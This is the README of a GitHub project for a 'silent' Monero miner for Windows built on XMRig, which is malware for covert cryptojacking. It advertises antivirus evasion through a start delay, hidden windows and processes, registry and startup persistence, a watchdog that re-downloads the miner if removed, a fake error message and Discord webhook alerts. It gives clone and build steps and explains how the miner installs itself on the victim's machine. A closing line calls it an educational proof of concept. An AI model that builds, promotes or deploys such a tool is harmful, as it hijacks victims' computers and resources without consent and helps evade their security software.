# Skar Silent XMR Miner For Windows
A silent monero crypto miner for windows made in c++ that implements xmrig

 ## Features !
- Custom start delay to avoid av and suspison
- Add to startup
- Add to registry for persisance and makes key
- Hidden window and hidden process
- Custom installation (in /temp folder)
- Watchdog to ensure miner isnt delete or closes, redownloads if it isnt mining.
- Custom miner config
- Fake error message
- Discord webhook notify

  # Installtion:
  Instructions on how to install *SkarSilentMiner*
```bash
git clone https://github.com/SkarSys/SilentXmrMiner.git
```

# Usage:
## Setting up the miner:
- First open the main.cpp file
- Next, scroll down intil you see "Veriables To Change"
- Change whatever you want, make sure to change the xmr address, pool, and discord web hook
- Build it (x64 release!!)
- Done!

# How it works:
- Miner: My silent xmr miner uses a precompiled version of XMRIG, it downloads it on the client, installs and adds it to startup then, using your settings (xmr address, pool) it runs xmrig on commands line.
- Watchdog: the watchdog is very simple, its placed in a simple while loop at the end of the code. The loop checks the running processes using the windows api and if the miner is not found or is deleted, it will then reinstall it and start it with your initial settings.

# Conditions:
- This is a POC and is meant for educational perpuse only! I am not liable for any damage caused by SkarRat and will not be held accountable.
